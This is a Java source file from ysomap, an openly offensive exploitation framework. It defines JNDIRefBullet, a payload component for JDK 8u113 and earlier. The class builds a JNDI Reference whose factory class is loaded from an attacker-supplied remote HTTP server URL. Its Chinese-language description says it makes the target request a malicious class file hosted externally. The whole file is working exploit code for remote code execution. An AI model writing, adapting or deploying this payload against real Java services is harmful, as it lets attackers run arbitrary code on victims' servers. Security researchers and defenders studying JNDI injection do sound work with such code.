package ysomap.bullets.jdk.rmi;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

import javax.naming.Reference;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Bullets
@Dependencies({"<=jdk8u113"})
@Details("适用于JNDI，向外部挂载了恶意class文件的HTTP服务发起请求")
@Authors({Authors.WH1T3P1G})
public class JNDIRefBullet implements Bullet<Reference> {

    @Require(name = "factoryName", detail = "filename mounted by remote http server")
    private String factoryName;
    @Require(name = "factoryURL", detail = "remote http server URL")
    private String factoryURL;


    @Override
    public Reference getObject() throws Exception {
        if(factoryURL!=null && !factoryURL.endsWith("/")){
            factoryURL = factoryURL + "/";
        }
        return new Reference(factoryName, factoryName, factoryURL);
    }
}
